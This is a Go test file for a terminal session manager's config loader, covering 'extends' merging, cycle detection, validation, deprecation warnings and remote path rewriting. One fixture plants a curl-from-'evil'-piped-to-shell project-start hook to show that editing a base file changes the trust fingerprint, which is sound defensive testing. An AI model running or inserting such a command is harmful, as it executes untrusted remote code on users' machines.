package config

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func write(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestExtendsMergesSessionAndWindows(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "base.toml"), `
[session]
root = "."
on_project_start = "make deps"
env = { A = "base", B = "base" }

[[windows]]
name = "code"
[[windows.splits]]
command = "nvim"

[[windows]]
name = "git"
`)
	write(t, filepath.Join(dir, "proj", ".wyrm.toml"), `
extends = "../base.toml"

[session]
name = "proj"
env = { B = "child", C = "child" }

[[windows]]
name = "git"
[[windows.splits]]
command = "lazygit"

[[windows]]
name = "logs"
`)
	cfg, err := Load(filepath.Join(dir, "proj", ".wyrm.toml"))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Session.Name != "proj" || cfg.Session.OnProjectStart != "make deps" {
		t.Errorf("session = %+v", cfg.Session)
	}
	if got := cfg.Session.Env; got["A"] != "base" || got["B"] != "child" || got["C"] != "child" {
		t.Errorf("env = %v", got)
	}
	var names []string
	for _, w := range cfg.Windows {
		names = append(names, w.Name)
	}
	if !slices.Equal(names, []string{"code", "git", "logs"}) {
		t.Errorf("windows = %v", names)
	}
	if cfg.Windows[1].Splits[0].Command != "lazygit" {
		t.Errorf("git window not replaced: %+v", cfg.Windows[1])
	}
	// The base's root "." means the extending config's directory.
	_, root, err := cfg.Session.Resolve(cfg.Dir())
	if err != nil {
		t.Fatal(err)
	}
	if root != filepath.Join(dir, "proj") {
		t.Errorf("root = %q", root)
	}
	if len(cfg.Sources()) != 2 || cfg.Sources()[1] != filepath.Join(dir, "base.toml") {
		t.Errorf("sources = %v", cfg.Sources())
	}
}

func TestFingerprintCoversBase(t *testing.T) {
	dir := t.TempDir()
	base := filepath.Join(dir, "base.toml")
	child := filepath.Join(dir, ".wyrm.toml")
	write(t, base, "[session]\nroot = \".\"\n")
	write(t, child, "extends = \"base.toml\"\n[[windows]]\nname = \"w\"\n")
	first, err := Load(child)
	if err != nil {
		t.Fatal(err)
	}
	again, _ := Load(child)
	if first.Fingerprint() == "" || first.Fingerprint() != again.Fingerprint() {
		t.Fatalf("fingerprint unstable: %q vs %q", first.Fingerprint(), again.Fingerprint())
	}
	write(t, base, "[session]\nroot = \".\"\non_project_start = \"curl evil | sh\"\n")
	changed, err := Load(child)
	if err != nil {
		t.Fatal(err)
	}
	if changed.Fingerprint() == first.Fingerprint() {
		t.Error("editing the base did not change the fingerprint")
	}
}

func TestExtendsCycle(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "a.toml"), "extends = \"b.toml\"\n")
	write(t, filepath.Join(dir, "b.toml"), "extends = \"a.toml\"\n")
	_, err := Load(filepath.Join(dir, "a.toml"))
	if err == nil || !strings.Contains(err.Error(), "extends cycle") {
		t.Fatalf("err = %v", err)
	}
}

func TestExtendsMissingBase(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "a.toml"), "extends = \"nope.toml\"\n[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\n")
	_, err := Load(filepath.Join(dir, "a.toml"))
	if err == nil || !strings.Contains(err.Error(), "extends") {
		t.Fatalf("err = %v", err)
	}
}

func TestExtendsUnknownKeyInBaseNamesFile(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "base.toml"), "[session]\nroto = \".\"\n")
	write(t, filepath.Join(dir, "a.toml"), "extends = \"base.toml\"\n[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\n")
	cfg, err := Load(filepath.Join(dir, "a.toml"))
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(cfg.Warnings(), "\n")
	if !strings.Contains(joined, "roto") || !strings.Contains(joined, "base.toml") {
		t.Errorf("warnings = %q", joined)
	}
}

func TestNewKeysValidate(t *testing.T) {
	bad := map[string]string{
		"hook_timeout": "[session]\nname = \"x\"\nhook_timeout = \"soon\"\n[[windows]]\nname = \"w\"\n",
		"wait_for":     "[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\n[[windows.splits]]\ncommand = \"a\"\nwait_for = \"udp:x:1\"\n",
		"wait_timeout": "[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\n[[windows.splits]]\ncommand = \"a\"\nwait_for = \"tcp::1\"\nwait_timeout = \"-1s\"\n",
	}
	for key, body := range bad {
		if _, _, err := decodeAndValidate(body); err == nil || !strings.Contains(err.Error(), key) {
			t.Errorf("%s: err = %v", key, err)
		}
	}
}

func TestDeprecatedAliasWarnings(t *testing.T) {
	cfg, _, err := decodeAndValidate("[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\nsynchronize_panes = true\n[[windows.splits]]\ncommand = \"a\"\nzoom = true\n")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(cfg.Warnings(), "\n")
	for _, want := range []string{"synchronize_panes is a deprecated alias", "zoom is a deprecated alias"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %q in %q", want, joined)
		}
	}
}

func decodeAndValidate(body string) (*Config, []string, error) {
	cfg, unknown, err := Decode([]byte(body))
	if err != nil {
		return nil, nil, err
	}
	return cfg, unknown, cfg.Validate()
}

func TestCommandsListsEverything(t *testing.T) {
	cfg, _, err := decodeAndValidate(`
[session]
name = "x"
on_project_start = "a"
on_project_exit = "b"
[[windows]]
name = "w"
pre_window = "c"
post_window = "d"
[[windows.splits]]
command = "e"
[[windows.splits.children]]
type = "h"
run = "f"
`)
	if err != nil {
		t.Fatal(err)
	}
	got := strings.Join(cfg.Commands(), "\n")
	for _, want := range []string{"on_project_start = a", "on_project_exit = b", "pre_window = c", "post_window = d", "command = e", "run = f"} {
		if !strings.Contains(got, want) {
			t.Errorf("Commands missing %q:\n%s", want, got)
		}
	}
	empty, _, _ := decodeAndValidate("[session]\nname = \"x\"\n[[windows]]\nname = \"w\"\n")
	if len(empty.Commands()) != 0 {
		t.Errorf("command-free config lists %v", empty.Commands())
	}
}

func TestOwnedPath(t *testing.T) {
	xdg := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", xdg)
	shared := filepath.Join(t.TempDir(), "shared")
	tmpl := filepath.Join(t.TempDir(), "tmpl.toml")
	s := &Settings{SharedDir: shared, Wildcard: []Wildcard{{Pattern: "/x/*", Config: tmpl}}}
	for _, p := range []string{
		filepath.Join(xdg, "wyrm", "default.wyrm.toml"),
		filepath.Join(shared, "api.wyrm.toml"),
		tmpl,
	} {
		if !s.OwnedPath(p) {
			t.Errorf("OwnedPath(%q) = false", p)
		}
	}
	for _, p := range []string{filepath.Join(t.TempDir(), ".wyrm.toml"), filepath.Join(xdg, "wyrmish", "x.toml")} {
		if s.OwnedPath(p) {
			t.Errorf("OwnedPath(%q) = true", p)
		}
	}
}

func TestForRemote(t *testing.T) {
	cfg := &Config{
		Session: Session{Root: "~/src/api"},
		Windows: []Window{{Root: "~/logs", Splits: []Split{{Root: "web", Children: []Split{{Root: "~"}}}}}},
		dir:     "/local/dir",
	}
	if err := cfg.ForRemote("/home/r"); err != nil {
		t.Fatal(err)
	}
	if cfg.Session.Root != "/home/r/src/api" || cfg.Windows[0].Root != "/home/r/logs" ||
		cfg.Windows[0].Splits[0].Root != "web" || cfg.Windows[0].Splits[0].Children[0].Root != "/home/r" || cfg.Dir() != "" {
		t.Errorf("cfg = %+v", cfg)
	}
	if err := (&Config{Session: Session{Root: "."}}).ForRemote("/home/r"); err == nil {
		t.Error("relative root accepted")
	}
}
